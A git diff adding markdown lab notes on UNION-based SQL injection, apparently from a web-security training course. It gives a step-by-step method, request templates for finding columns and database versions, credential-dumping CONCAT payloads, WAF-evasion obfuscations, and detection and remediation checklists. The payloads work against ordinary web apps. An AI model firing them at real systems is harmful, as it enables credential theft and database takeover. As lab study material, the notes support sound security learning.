@@ -929,3 +929,213 @@ GET /filter?category=<CATEGORY>' UNION SELECT CONCAT(username,'~',password)-- HT
 Count NULLs → find reflected column → concat(username~password) → get admin → login.
 
 ---
+
+# 🔐 SQL Injection Lab-7 — UNION / Retrieve Data — Notes 
+
+---
+
+## 🔹 1. What is a SQLi UNION attack? (short)
+
+A *UNION SQL Injection* appends results of an attacker-controlled SELECT query to the legitimate query output.  
+If the web app *renders DB data in responses*, the attacker can make it display results from other tables (like users, creds, etc.) in the normal page.
+
+✅ Works only if:
+
+- The injected UNION SELECT has *the same number of columns* as the original query.
+- The columns are *data type-compatible* (text columns for text, etc.).
+
+---
+
+## 🔹 2. Why this matters (real-world risk)
+
+- 📤 *Data exfiltration:* usernames, passwords, API keys, internal records.  
+- 🧩 *DB fingerprinting:* identify DB version to tailor payloads.  
+- 💀 *Escalation path:* dump credentials → log in → pivot to full takeover.
+
+---
+
+## 🔹 3. High-value parameters to test
+
+- /filter?category=, /search?q=, /sort=, /id=, /page=
+- JSON keys in POST bodies: { "query": "..." }
+- Export/CSV endpoints
+- Any feature showing lists, tables, or categories on the frontend
+
+---
+
+## 🔹 4. Quick recon checklist
+
+1️⃣ Check if input is quoted → send value' and watch for error/response changes.  
+2️⃣ Try comment styles: -- ` (note space), `#, and /*...*/.  
+3️⃣ Use UNION SELECT NULL,... to find *column count (N)*.  
+4️⃣ Inject 'MAGIC' strings into each column to find *string-compatible* columns.  
+5️⃣ Once confirmed, inject version() / @@version to confirm DB type and solve the lab.
+
+---
+
+## 🔹 5. Exact lab methodology 
+
+### 🧩 Step 1 — Capture the target request
+
+GET /filter?category=Gifts HTTP/1.1 Host: <HOST>
+
+→ Send to *Repeater* for manual payload testing.
+
+---
+
+### 🧩 Step 2 — Test quoting & comment syntax
+
+Try:
+
+?category=Gifts'
+
+→ If you get an SQL error (500), parameter is *quoted*.
+
+Now test which comment syntax is accepted:
+
+?category=Gifts'# ?category=Gifts'--%20
+
+✅ In this lab, *# worked* successfully (MySQL).
+
+---
+
+### 🧩 Step 3 — Find column count
+
+Start with:
+
+?category=Gifts' UNION SELECT NULL# ?category=Gifts' UNION SELECT NULL,NULL#
+
+→ The request returning a *normal 200 response* indicates the correct number of columns.  
+In this case: ✅ *2 columns*.
+
+---
+
+### 🧩 Step 4 — Identify string-compatible column(s)
+
+Inject marker tokens:
+
+?category=Gifts' UNION SELECT 'MAGIC',NULL# ?category=Gifts' UNION SELECT NULL,'MAGIC'#
+
+→ The one displaying *MAGIC* in the page is the *string column* (e.g., column 1).
+
+---
+
+### 🧩 Step 5 — Retrieve database version
+
+Now replace 'MAGIC' with DB version query:
+
+MySQL  →  ?category=Gifts' UNION SELECT @@version,NULL# Postgres → ?category=Gifts' UNION SELECT version(),NULL# MSSQL  →  ?category=Gifts' UNION SELECT @@VERSION,NULL#
+
+→ The response displaying the version string proves successful UNION-based SQLi.
+
+---
+
+## 🧾 Proof / Evidence
+
+*Screenshot 1 — Confirmed UNION Injection with DB Version*
+
+![Apply single quoted comma ,then hashtag,then number of coulmns ,then reflected column ,then db version](📸../images/sqli-union-db-version.png)
+
+*Description:*  
+Repeater request sequence showing:  
+1️⃣ ' added → SQL error observed.  
+2️⃣ # comment accepted → 200 OK.  
+3️⃣ UNION SELECT NULL,NULL# → correct column count found.  
+4️⃣ UNION SELECT @@version,NULL# → DB version reflected in response (proof of successful UNION SQLi).
+
+---
+
+## 🔹 6. Repeater-ready PoC templates
+
+*Find number of columns:*
+
+GET /filter?category=Gifts' UNION SELECT NULL,NULL# HTTP/1.1 Host: <HOST>
+
+*Detect string column:*
+
+GET /filter?category=Gifts' UNION SELECT 'MAGIC',NULL# HTTP/1.1 Host: <HOST>
+
+*Show DB version:*
+
+GET /filter?category=Gifts' UNION SELECT @@version,NULL# HTTP/1.1 Host: <HOST>
+
+---
+
+## 🔹 7. Why # vs -- matters
+
+- -- *must* have a trailing space (e.g., `-- `).  
+- # works directly in *MySQL* and raw Repeater requests.  
+⚠️ Note: Browsers treat # as a fragment — always use *Repeater*, not the browser.
+
+---
+
+## 🔹 8. Troubleshooting & common issues
+
+- Browser removes/ignores # → use *Repeater*.  
+- 500 error → adjust column count.  
+- No visible result → check reflected column or HTML source.  
+- WAF blocks UNION → try obfuscation:
+  - UN/**/ION SELECT
+  - UNI%0AON
+  - CHAR() / CONCAT() payloads
+
+---
+
+## 🔹 9. Detection (what defenders see)
+
+- SQL keywords (UNION, SELECT, version()) in URLs.
+- Response-length anomalies or timing shifts.
+- Bursts of test payloads with ', --, or #.
+
+---
+
+## 🔹 10. Remediation checklist
+
+✅ *Parameterized queries* only (no string concatenation).  
+✅ *Least-privilege* DB user (no admin perms).  
+✅ *No verbose DB errors* to clients.  
+✅ *Input validation* and whitelisting.  
+✅ *Rate-limit* & log suspicious requests.  
+✅ *WAF* for additional filtering/logging.
+
+---
+
+## 🔹 11. Pentest quick checklist
+
+1️⃣ Capture request → Repeater  
+2️⃣ Test ' → confirm quote  
+3️⃣ Identify comment (# / --)  
+4️⃣ Find number of columns → NULL sequence  
+5️⃣ Identify reflected column with 'MARK'  
+6️⃣ Inject @@version / version()  
+7️⃣ (If possible) extract user data with UNION SELECT  
+8️⃣ Save PoC requests + raw responses  
+9️⃣ Recommend remediation steps
+
+---
+
+## 🔹 12. Pocket memory cue
+
+> ' → comment → count columns → mark → version() → dump data.
+
+---
+
+## 🔹 Out-of-the-box / Advanced snippets 
+
+*Comment syntaxes*
+
+--%20     # (MySQL only) /.../   (universal)
+
+*Column discovery*
+
+UNION SELECT NULL# UNION SELECT NULL,NULL# UNION SELECT NULL,NULL,NULL#
+
+*DB version*
+
+MySQL:    @@version Postgres: version() MSSQL:    @@VERSION SQLite:   sqlite_version()
+
+*Concatenation (if 1 string column)*
+
+MySQL/Postgres: CONCAT(username,':',password) MSSQL: username + ':' + password Oracle: username || ':' || password
+
+---
